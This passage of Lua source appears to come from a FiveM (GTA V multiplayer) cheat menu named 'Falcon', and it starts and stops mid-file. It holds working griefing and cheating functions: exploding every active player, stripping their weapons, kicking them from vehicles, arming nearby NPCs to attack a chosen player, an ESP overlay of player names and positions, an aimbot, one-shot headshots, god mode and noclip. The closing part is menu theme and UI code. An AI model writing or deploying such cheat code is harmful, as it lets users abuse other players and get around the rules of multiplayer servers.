						ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
						ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
						SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
						SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
						SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
	end



	local function fixcar()
	ShowInfo("~g~Car fixed!")
						SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
						SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
						SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
						SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
						Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)

			end


	local function FixVeh(veh)
		SetVehicleEngineHealth(veh, 1000)
		SetVehicleFixed(veh)
	end

	local function ExplodePlayer(target)
		local ped = GetPlayerPed(target)
		local coords = GetEntityCoords(ped)
		AddExplosion(coords.x + 1, coords.y + 1, coords.z + 1, 4, 100.0, true, false, 0.0)
	end

	local function ExplodeAll(self)
		local plist = GetActivePlayers()
		for i = 0, #plist do
			if not self and i == PlayerId() then i = i + 1 end
			ExplodePlayer(i)
		end
	end

	-- Thanks to Fallen#0811 for the idea
	local function PedAttack(target, attackType)
		local coords = GetEntityCoords(GetPlayerPed(target))

		if attackType == 1 then weparray = allweapons
		elseif attackType == 2 then weparray = meleeweapons
		elseif attackType == 3 then weparray = pistolweapons
		elseif attackType == 4 then weparray = heavyweapons
		end

		for k in EnumeratePeds() do
			if k ~= GetPlayerPed(target) and not IsPedAPlayer(k) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) < 2000 then
				local rand = math.ceil(math.random(#weparray))
				if weparray ~= allweapons then GiveWeaponToPed(k, GetHashKey(weparray[rand][1]), 9999, 0, 1)
				else GiveWeaponToPed(k, GetHashKey(weparray[rand]), 9999, 0, 1) end
				ClearPedTasks(k)
				TaskCombatPed(k, GetPlayerPed(target), 0, 16)
				SetPedCombatAbility(k, 100)
				SetPedCombatRange(k, 2)
				SetPedCombatAttributes(k, 46, 1)
				SetPedCombatAttributes(k, 5, 1)
			end
		end
	end


	function ApplyShockwave(entity)
		local pos = GetEntityCoords(PlayerPedId())
		local coord = GetEntityCoords(entity)
		local dx = coord.x - pos.x
		local dy = coord.y - pos.y
		local dz = coord.z - pos.z
		local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
		local distanceRate = (50 / distance) * math.pow(1.04, 1 - distance)
		ApplyForceToEntity(entity, 1, distanceRate * dx, distanceRate * dy, distanceRate * dz, math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), true, false, true, true, true, true)
	end

	local function DoForceFieldTick(radius)
		local player = PlayerPedId()
		local coords = GetEntityCoords(PlayerPedId())
		local playerVehicle = GetPlayersLastVehicle()
		local inVehicle = IsPedInVehicle(player, playerVehicle, true)

		DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, false, true, 2, nil, nil, false)

		for k in EnumerateVehicles() do
			if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
				RequestControlOnce(k)
				ApplyShockwave(k)
			end
		end

		for k in EnumeratePeds() do
			if k ~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
				RequestControlOnce(k)
				SetPedRagdollOnCollision(k, true)
				SetPedRagdollForceFall(k)
				ApplyShockwave(k)
			end
		end
	end

	local function DoRapidFireTick()
		DisablePlayerFiring(PlayerPedId(), true)
		if IsDisabledControlPressed(0, Keys["MOUSE1"]) then
			local _, weapon = GetCurrentPedWeapon(PlayerPedId())
			local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
			local camDir = GetCamDirFromScreenCenter()
			local camPos = GetGameplayCamCoord()
			local launchPos = GetEntityCoords(wepent)
			local targetPos = camPos + (camDir * 200.0)

			ClearAreaOfProjectiles(launchPos, 0.0, 1)

			ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
			ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
		end
	end

	local function StripPlayer(target)
		local ped = GetPlayerPed(target)
		RemoveAllPedWeapons(ped, false)
	end

	local function StripAll(self)
		local plist = GetActivePlayers()
		for i = 0, #plist do
			if not self and i == PlayerId() then i = i + 1 end
			StripPlayer(i)
		end
	end

	local function KickFromVeh(target)
		local ped = GetPlayerPed(target)
		if IsPedInAnyVehicle(ped, false) then
			ClearPedTasksImmediately(ped)
		end
	end

	local function KickAllFromVeh(self)
		local plist = GetActivePlayers()
		for i = 0, #plist do
			if not self and i == PlayerId() then i = i + 1 end
			KickFromVeh(i)
		end
	end

	local function CancelAnimsAll(self)
		local plist = GetActivePlayers()
		for i = 0, #plist do
			if not self and i == PlayerId() then i = i + 1 end
			ClearPedTasksImmediately(GetPlayerPed(plist[i]))
		end
	end

	local function RandomClothes(target)
		local ped = GetPlayerPed(target)
		SetPedRandomComponentVariation(ped, false)
		SetPedRandomProps(ped)
	end

	local function GiveAllWeapons(target)
		local ped = GetPlayerPed(target)
		for i = 0, #allweapons do
			GiveWeaponToPed(ped, GetHashKey(allweapons[i]), 9999, false, false)
		end
	end

	local function GiveAllPlayersWeapons(self)
		local plist = GetActivePlayers()
		for i = 0, #plist do
			if not self and i == PlayerId() then i = i + 1 end
			GiveAllWeapons(i)
		end
	end

	local function GiveWeapon(target, weapon)
		local ped = GetPlayerPed(target)
		GiveWeaponToPed(ped, GetHashKey(weapon), 9999, false, false)
	end

	local function GiveMaxAmmo(target)
		local ped = GetPlayerPed(target)
		for i = 1, #allweapons do
			AddAmmoToPed(ped, GetHashKey(allweapons[i]), 9999)
		end
	end

	local function TeleportToPlayer(target)
		local ped = GetPlayerPed(target)
		local pos = GetEntityCoords(ped)
		SetEntityCoords(PlayerPedId(), pos)
	end

	local function TeleportToWaypoint()
		local entity = PlayerPedId()
		if IsPedInAnyVehicle(entity, false) then
			entity = GetVehiclePedIsUsing(entity)
		end
		local success = false
		local blipFound = false
		local blipIterator = GetBlipInfoIdIterator()
		local blip = GetFirstBlipInfoId(8)

		while DoesBlipExist(blip) do
			if GetBlipInfoIdType(blip) == 4 then
				cx, cy, cz = table.unpack(Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()))--GetBlipInfoIdCoord(blip)
				blipFound = true
				break
			end
			blip = GetNextBlipInfoId(blipIterator)
			Wait(0)
		end

		if blipFound then
			local groundFound = false
			local yaw = GetEntityHeading(entity)

			for i = 0, 1000, 1 do
				SetEntityCoordsNoOffset(entity, cx, cy, ToFloat(i), false, false, false)
				SetEntityRotation(entity, 0, 0, 0, 0, 0)
				SetEntityHeading(entity, yaw)
				SetGameplayCamRelativeHeading(0)
				Wait(0)
				if GetGroundZFor_3dCoord(cx, cy, ToFloat(i), cz, false) then
					cz = ToFloat(i)
					groundFound = true
					break
				end
			end
			if not groundFound then
				cz = -300.0
			end
			success = true
		else
			ShowInfo('~r~Blip not found')
		end

		if success then
		ShowInfo("~g~Teleported!")
			SetEntityCoordsNoOffset(entity, cx, cy, cz, false, false, true)
			SetGameplayCamRelativeHeading(0)
			if IsPedSittingInAnyVehicle(PlayerPedId()) then
				if GetPedInVehicleSeat(GetVehiclePedIsUsing(PlayerPedId()), -1) == PlayerPedId() then
					SetVehicleOnGroundProperly(GetVehiclePedIsUsing(PlayerPedId()))
				end
			end
		end

	end


	local function ToggleGodmode(tog)
		local ped = PlayerPedId()
		SetEntityProofs(ped, tog, tog, tog, tog, tog)
		SetPedCanRagdoll(ped, not tog)
	end

	local function ToggleNoclip()
	ShowInfo("Noclipping ~g~[ON]")
		Noclipping = not Noclipping
		if Noclipping then
			SetEntityVisible(PlayerPedId(), false, false)
		else
			SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
			SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, false)
			SetEntityVisible(PlayerPedId(), true, false)
		end
	end

	local function ToggleESP()
		ESPEnabled = not ESPEnabled
		local _,x,y = false, 0.0, 0.0

		Citizen.CreateThread(function()
			while ESPEnabled do
				local plist = GetActivePlayers()
				table.removekey(plist, PlayerId())
				for i = 1, #plist do
					local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
					_, x, y = GetScreenCoordFromWorldCoord(targetCoords.x, targetCoords.y, targetCoords.z)
				end
				Wait(ESPRefreshTime)
			end
		end)


		Citizen.CreateThread(function()
			while ESPEnabled do
				local plist = GetActivePlayers()
				table.removekey(plist, PlayerId())
				for i = 1, #plist do
					local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
					local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), targetCoords)
					if distance <= EspDistance then
						local _, wephash = GetCurrentPedWeapon(GetPlayerPed(plist[i]), 1)
						local wepname = GetWeaponNameFromHash(wephash)
						local vehname = "On Foot"
						if IsPedInAnyVehicle(GetPlayerPed(plist[i]), 0) then
							vehname = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(GetPlayerPed(plist[i])))))
						end
						if wepname == nil then
							wepname = "Unknown"
						end
						DrawRect(x, y, 0.008, 0.01, 0, 0, 255, 255)
						DrawRect(x, y, 0.003, 0.005, 255, 0, 0, 255)
						local espstring1 = "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "~w~  |  ~b~Name: ~w~" .. GetPlayerName(plist[i]) .. "  |  ~b~Distance: ~w~" .. math.floor(distance)
						local espstring2 = "~b~Weapon: ~w~" .. wepname .. "  |  ~b~Vehicle: ~w~" .. vehname
						DrawTxt(espstring1, x - 0.05, y - 0.04, 0.0, 0.2)
						DrawTxt(espstring2, x - 0.05, y - 0.03, 0.0, 0.2)
					end
				end
				Wait(0)
			end
		end)
	end

	function ToggleBlips()
		BlipsEnabled = not BlipsEnabled

		if not BlipsEnabled then
			for i = 1, #pblips do
				RemoveBlip(pblips[i])
			end
		else

			Citizen.CreateThread(function()
				pblips = {}
				while BlipsEnabled do
					local plist = GetActivePlayers()
					table.removekey(plist, PlayerId())
					for i = 1, #plist do
						if NetworkIsPlayerActive(plist[i]) then
							ped = GetPlayerPed(plist[i])
							pblips[i] = GetBlipFromEntity(ped)
							if not DoesBlipExist(pblips[i]) then
								pblips[i] = AddBlipForEntity(ped)
								SetBlipSprite(pblips[i], 1)
								Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
							else
								veh = GetVehiclePedIsIn(ped, false)
								blipSprite = GetBlipSprite(pblips[i])
								if not GetEntityHealth(ped) then
									if blipSprite ~= 274 then
										SetBlipSprite(pblips[i], 274)
										Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
									end
								elseif veh then
									vehClass = GetVehicleClass(veh)
									vehModel = GetEntityModel(veh)
									if vehClass == 15 then
										if blipSprite ~= 422 then
											SetBlipSprite(pblips[i], 422)
											Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
										end
									elseif vehClass == 16 then
										if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra")
											or vehModel == GetHashKey("lazer") then -- jet
											if blipSprite ~= 424 then
												SetBlipSprite(pblips[i], 424)
												Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
											end
										elseif blipSprite ~= 423 then
											SetBlipSprite(pblips[i], 423)
											Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
										end
									elseif vehClass == 14 then
										if blipSprite ~= 427 then
											SetBlipSprite(pblips[i], 427)
											Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
										end
									elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2")
										or vehModel == GetHashKey("limo2") then
										if blipSprite ~= 426 then
											SetBlipSprite(pblips[i], 426)
											Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
										end
									elseif vehModel == GetHashKey("rhino") then
										if blipSprite ~= 421 then
											SetBlipSprite(pblips[i], 421)
											Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
										end
									elseif blipSprite ~= 1 then
										SetBlipSprite(pblips[i], 1)
										Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
									end


									passengers = GetVehicleNumberOfPassengers(veh)
									if passengers then
										if not IsVehicleSeatFree(veh, -1) then
											passengers = passengers + 1
										end
										ShowNumberOnBlip(pblips[i], passengers)
									else
										HideNumberOnBlip(pblips[i])
									end
								else


									HideNumberOnBlip(pblips[i])
									if blipSprite ~= 1 then
										SetBlipSprite(pblips[i], 1)
										Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
									end
								end
								SetBlipRotation(pblips[i], math.ceil(GetEntityHeading(veh)))
								SetBlipNameToPlayerName(pblips[i], plist[i])
								SetBlipScale(pblips[i], 0.85)


								if IsPauseMenuActive() then
									SetBlipAlpha(pblips[i], 255)
								else
									x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
									x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(plist[i]), true))
									distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
									if distance < 0 then
										distance = 0
									elseif distance > 255 then
										distance = 255
									end
									SetBlipAlpha(pblips[i], distance)
								end
							end
						end
					end
					Wait(0)
				end
			end)
		end
	end

	local function ShootAt(target, bone)
		local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
		SetPedShootsAtCoord(PlayerPedId(), boneTarget, true)
	end

	local function ShootAt2(target, bone, damage)
		local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
		local _, weapon = GetCurrentPedWeapon(PlayerPedId())
		ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, damage, true, weapon, PlayerPedId(), true, true, 1000.0)
	end

	local function ShootAimbot(k)
		if IsEntityOnScreen(k) and HasEntityClearLosToEntityInFront(PlayerPedId(), k) and
			not IsPedDeadOrDying(k) and not IsPedInVehicle(k, GetVehiclePedIsIn(k), false) and
			IsDisabledControlPressed(0, Keys["MOUSE1"]) and IsPlayerFreeAiming(PlayerId()) then
			local x, y, z = table.unpack(GetEntityCoords(k))
			local _, _x, _y = World3dToScreen2d(x, y, z)
			if _x > 0.25 and _x < 0.75 and _y > 0.25 and _y < 0.75 then
				local _, weapon = GetCurrentPedWeapon(PlayerPedId())
				ShootAt2(k, AimbotBone, GetWeaponDamage(weapon, 1))
			end
		end
	end

	local function RageShoot(target)
		if not IsPedDeadOrDying(target) then
			local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, "SKEL_HEAD"), 0.0, 0.0, 0.0)
			local _, weapon = GetCurrentPedWeapon(PlayerPedId())
			ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
			ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0.1, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
			ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0.1, 0, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
		end
	end

	local function NameToBone(name)
		if name == "Head" then
			return "SKEL_Head"
		elseif name == "Chest" then
			return "SKEL_Spine2"
		elseif name == "Left Arm" then
			return "SKEL_L_UpperArm"
		elseif name == "Right Arm" then
			return "SKEL_R_UpperArm"
		elseif name == "Left Leg" then
			return "SKEL_L_Thigh"
		elseif name == "Right Leg" then
			return "SKEL_R_Thigh"
		elseif name == "Dick" then
			return "SKEL_Pelvis"
		else
			return "SKEL_ROOT"
		end
	end

	local function SpawnVeh(model, PlaceSelf, SpawnEngineOn)
		RequestModel(GetHashKey(model))
		Wait(500)
		if HasModelLoaded(GetHashKey(model)) then
			local coords = GetEntityCoords(PlayerPedId())
			local xf = GetEntityForwardX(PlayerPedId())
			local yf = GetEntityForwardY(PlayerPedId())
			local heading = GetEntityHeading(PlayerPedId())
			local veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
			if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
			if SpawnEngineOn then SetVehicleEngineOn(veh, 1, 1) end
			return veh
		else ShowInfo("~r~Model not recognized (Try Again)") end
	end

	local function SpawnPlane(model, PlaceSelf, SpawnInAir)
		RequestModel(GetHashKey(model))
		Wait(500)
		if HasModelLoaded(GetHashKey(model)) then
			local coords = GetEntityCoords(PlayerPedId())
			local xf = GetEntityForwardX(PlayerPedId())
			local yf = GetEntityForwardY(PlayerPedId())
			local heading = GetEntityHeading(PlayerPedId())
			local veh = nil
			if SpawnInAir then
				veh = CreateVehicle(GetHashKey(model), coords.x + xf * 20, coords.y + yf * 20, coords.z + 500, heading, 1, 1)
			else
				veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
			end
			if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
		else ShowInfo("~r~Model not recognized (Try Again)") end
	end

	local function GetCurrentOutfit(target)
		local ped = GetPlayerPed(target)
		outfit = {}

		outfit.hat = GetPedPropIndex(ped, 0)
		outfit.hat_texture = GetPedPropTextureIndex(ped, 0)

		outfit.glasses = GetPedPropIndex(ped, 1)
		outfit.glasses_texture = GetPedPropTextureIndex(ped, 1)

		outfit.ear = GetPedPropIndex(ped, 2)
		outfit.ear_texture = GetPedPropTextureIndex(ped, 2)

		outfit.watch = GetPedPropIndex(ped, 6)
		outfit.watch_texture = GetPedPropTextureIndex(ped, 6)

		outfit.wrist = GetPedPropIndex(ped, 7)
		outfit.wrist_texture = GetPedPropTextureIndex(ped, 7)

		outfit.head_drawable = GetPedDrawableVariation(ped, 0)
		outfit.head_palette = GetPedPaletteVariation(ped, 0)
		outfit.head_texture = GetPedTextureVariation(ped, 0)

		outfit.beard_drawable = GetPedDrawableVariation(ped, 1)
		outfit.beard_palette = GetPedPaletteVariation(ped, 1)
		outfit.beard_texture = GetPedTextureVariation(ped, 1)

		outfit.hair_drawable = GetPedDrawableVariation(ped, 2)
		outfit.hair_palette = GetPedPaletteVariation(ped, 2)
		outfit.hair_texture = GetPedTextureVariation(ped, 2)

		outfit.torso_drawable = GetPedDrawableVariation(ped, 3)
		outfit.torso_palette = GetPedPaletteVariation(ped, 3)
		outfit.torso_texture = GetPedTextureVariation(ped, 3)

		outfit.legs_drawable = GetPedDrawableVariation(ped, 4)
		outfit.legs_palette = GetPedPaletteVariation(ped, 4)
		outfit.legs_texture = GetPedTextureVariation(ped, 4)

		outfit.hands_drawable = GetPedDrawableVariation(ped, 5)
		outfit.hands_palette = GetPedPaletteVariation(ped, 5)
		outfit.hands_texture = GetPedTextureVariation(ped, 5)

		outfit.foot_drawable = GetPedDrawableVariation(ped, 6)
		outfit.foot_palette = GetPedPaletteVariation(ped, 6)
		outfit.foot_texture = GetPedTextureVariation(ped, 6)

		outfit.acc1_drawable = GetPedDrawableVariation(ped, 7)
		outfit.acc1_palette = GetPedPaletteVariation(ped, 7)
		outfit.acc1_texture = GetPedTextureVariation(ped, 7)

		outfit.acc2_drawable = GetPedDrawableVariation(ped, 8)
		outfit.acc2_palette = GetPedPaletteVariation(ped, 8)
		outfit.acc2_texture = GetPedTextureVariation(ped, 8)

		outfit.acc3_drawable = GetPedDrawableVariation(ped, 9)
		outfit.acc3_palette = GetPedPaletteVariation(ped, 9)
		outfit.acc3_texture = GetPedTextureVariation(ped, 9)

		outfit.mask_drawable = GetPedDrawableVariation(ped, 10)
		outfit.mask_palette = GetPedPaletteVariation(ped, 10)
		outfit.mask_texture = GetPedTextureVariation(ped, 10)

		outfit.aux_drawable = GetPedDrawableVariation(ped, 11)
		outfit.aux_palette = GetPedPaletteVariation(ped, 11)
		outfit.aux_texture = GetPedTextureVariation(ped, 11)

		return outfit
	end

	local function SetCurrentOutfit(outfit)
		local ped = PlayerPedId()

		SetPedPropIndex(ped, 0, outfit.hat, outfit.hat_texture, 1)
		SetPedPropIndex(ped, 1, outfit.glasses, outfit.glasses_texture, 1)
		SetPedPropIndex(ped, 2, outfit.ear, outfit.ear_texture, 1)
		SetPedPropIndex(ped, 6, outfit.watch, outfit.watch_texture, 1)
		SetPedPropIndex(ped, 7, outfit.wrist, outfit.wrist_texture, 1)

		SetPedComponentVariation(ped, 0, outfit.head_drawable, outfit.head_texture, outfit.head_palette)
		SetPedComponentVariation(ped, 1, outfit.beard_drawable, outfit.beard_texture, outfit.beard_palette)
		SetPedComponentVariation(ped, 2, outfit.hair_drawable, outfit.hair_texture, outfit.hair_palette)
		SetPedComponentVariation(ped, 3, outfit.torso_drawable, outfit.torso_texture, outfit.torso_palette)
		SetPedComponentVariation(ped, 4, outfit.legs_drawable, outfit.legs_texture, outfit.legs_palette)
		SetPedComponentVariation(ped, 5, outfit.hands_drawable, outfit.hands_texture, outfit.hands_palette)
		SetPedComponentVariation(ped, 6, outfit.foot_drawable, outfit.foot_texture, outfit.foot_palette)
		SetPedComponentVariation(ped, 7, outfit.acc1_drawable, outfit.acc1_texture, outfit.acc1_palette)
		SetPedComponentVariation(ped, 8, outfit.acc2_drawable, outfit.acc2_texture, outfit.acc2_palette)
		SetPedComponentVariation(ped, 9, outfit.acc3_drawable, outfit.acc3_texture, outfit.acc3_palette)
		SetPedComponentVariation(ped, 10, outfit.mask_drawable, outfit.mask_texture, outfit.mask_palette)
		SetPedComponentVariation(ped, 11, outfit.aux_drawable, outfit.aux_texture, outfit.aux_palette)
	end

	local function GetResources()
		local resources = {}
		for i = 1, GetNumResources() do
			resources[i] = GetResourceByFindIndex(i)
		end
		return resources
	end

	function IsResourceInstalled(name)
		local resources = GetResources()
		for i = 1, #resources do
			if resources[i] == name then
				return true
			else
				return false
			end
		end
	end

	function Falcon.SetFont(id, font)
		buttonFont = font
		menus[id].titleFont = font
	end

	function Falcon.SetMenuFocusBackgroundColor(id, r, g, b, a)
		setMenuProperty(id, "menuFocusBackgroundColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusBackgroundColor.a})
	end

	function Falcon.SetMaxOptionCount(id, count)
		setMenuProperty(id, 'maxOptionCount', count)
	end

	function Falcon.PopupWindow(x, y, title)

	end


	function Falcon.SetTheme(id, theme)
		if theme == "basic" then
			Falcon.SetMenuBackgroundColor(id, 81, 231, 251, 125)
			Falcon.SetTitleBackgroundColor(id, 92, 212, 249, 80)
			Falcon.SetTitleColor(id, 92, 212, 249, 230)
			Falcon.SetMenuSubTextColor(id, 255, 255, 255, 230)
			Falcon.SetMenuFocusColor(id, 40, 40, 40, 230)
			Falcon.SetFont(id, 7)
			Falcon.SetMenuX(id, .75)-- [0.0..1.0] top left corner
			Falcon.SetMenuY(id, .1)-- [0.0..1.0] top
			Falcon.SetMenuWidth(id, 0.23)-- 0.23
			Falcon.SetMaxOptionCount(id, 12)-- 10
			
			titleHeight = 0.11 --0.11
			titleXOffset = 0.5 -- 0.5
			titleYOffset = 0.03 --0.03
			titleSpacing = 2 -- 2
			buttonHeight = 0.038 --0.038
			buttonScale = 0.365 --0.365
			buttonTextXOffset = 0.005 --0.005
			buttonTextYOffset = 0.005 --0.005
			
			themecolor = '~b~'
			themearrow = "+"
		elseif theme == "dark" then
			Falcon.SetMenuBackgroundColor(id, 180, 80, 80, 125)
			Falcon.SetTitleBackgroundColor(id, 180, 80, 80, 90)
			Falcon.SetTitleColor(id, 180, 80, 80, 230)
			Falcon.SetMenuSubTextColor(id, 255, 255, 255, 230)
			Falcon.SetMenuFocusColor(id, 40, 40, 40, 230)
			Falcon.SetFont(id, 1)
			Falcon.SetMenuX(id, .75)
			Falcon.SetMenuY(id, .1)
			Falcon.SetMenuWidth(id, 0.23)-- 0.23
			Falcon.SetMaxOptionCount(id, 12)-- 10

			titleHeight = 0.11 --0.11
			titleXOffset = 0.5 -- 0.5
			titleYOffset = 0.03 --0.03
			titleSpacing = 2 -- 2
			buttonHeight = 0.038 --0.038
			buttonScale = 0.365 --0.365
			buttonTextXOffset = 0.005 --0.005
			buttonTextYOffset = 0.005 --0.005

			themecolor = '~r~'
			themearrow = ">"
		elseif theme == "Falcon" then
			Falcon.SetMenuBackgroundColor(id, 50, 50, 160, 85)
			Falcon.SetTitleBackgroundColor(id, 92, 212, 249, 170)
			Falcon.SetTitleColor(id, 92, 212, 249, 170)
			Falcon.SetMenuSubTextColor(id, 255, 255, 255, 230)
			Falcon.SetFont(id, 0)
			Falcon.SetMenuX(id, .75)
			Falcon.SetMenuY(id, .1)
			Falcon.SetMenuWidth(id, 0.23)-- 0.23
			Falcon.SetMaxOptionCount(id, 12)-- 10
			
			titleHeight = 0.11 --0.11
			titleXOffset = 0.5 -- 0.5
			titleYOffset = 0.03 --0.03
			titleSpacing = 2 -- 2
			buttonHeight = 0.038 --0.038
			buttonScale = 0.365 --0.365
			buttonTextXOffset = 0.005 --0.005
			buttonTextYOffset = 0.005 --0.005
			
			themecolor = '~u~'
			themearrow = "~u~>"

			titleHeight = 0.11 --0.11
			titleXOffset = 0.5 -- 0.5
			titleYOffset = 0.03 --0.03
			titleSpacing = 2 -- 2
			buttonHeight = 0.038 --0.038
			buttonScale = 0.365 --0.365
			buttonTextXOffset = 0.005 --0.005
			buttonTextYOffset = 0.005 --0.005

			themecolor = '~u~'
			themearrow = "~u~>"
		elseif theme == "infamous" then
			Falcon.SetMenuBackgroundColor(id, 38, 38, 38, 80)
			Falcon.SetTitleBackgroundColor(id, 92, 212, 249, 170)
			Falcon.SetTitleColor(id, 240, 240, 240, 255)
			Falcon.SetMenuSubTextColor(id, 240, 240, 240, 255)
			Falcon.SetMenuFocusBackgroundColor(id, 100, 220, 250, 180)
			Falcon.SetFont(id, 4)
			Falcon.SetMenuX(id, .725)
			Falcon.SetMenuY(id, .1)
			Falcon.SetMenuWidth(id, 0.25)-- 0.23
			Falcon.SetMaxOptionCount(id, 12)-- 10
			
			titleHeight = 0.07 --0.11
			titleXOffset = 0.2 -- 0.5
			titleYOffset = 0.005 --0.03
			titleScale = 0.7 -- 1.0
			titleSpacing = 1.5
			buttonHeight = 0.033 --0.038
			buttonScale = 0.360 --0.365
			buttonTextXOffset = 0.003 --0.005
			buttonTextYOffset = 0.0025 --0.005
			
			themecolor = "~s~"
			themearrow = ">>"
		end
	end

	function Falcon.InitializeTheme()
		for i = 1, #menulist do
			Falcon.SetTheme(menulist[i], theme)
		end
	end

	-- ComboBox w/ new index behaviour (does not wrap around)
	function Falcon.ComboBox2(text, items, currentIndex, selectedIndex, callback)
		local itemsCount = #items
		local selectedItem = items[currentIndex]
		local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

		if itemsCount > 1 and isCurrent then
			selectedItem = tostring(selectedItem)
		end

		if Falcon.Button(text, selectedItem) then
			selectedIndex = currentIndex
			callback(currentIndex, selectedIndex)
			return true
		elseif isCurrent then
			if currentKey == keys.left then
				if currentIndex > 1 then currentIndex = currentIndex - 1
				elseif currentIndex == 1 then currentIndex = 1 end
			elseif currentKey == keys.right then
				if currentIndex < itemsCount then  currentIndex = currentIndex + 1
				elseif currentIndex == itemsCount then currentIndex = itemsCount end
			end
		else
			currentIndex = selectedIndex
		end

		callback(currentIndex, selectedIndex)
		return false
	end

	-- Button with a slider
	function Falcon.ComboBoxSlider(text, items, currentIndex, selectedIndex, callback)
		local itemsCount = #items
		local selectedItem = items[currentIndex]
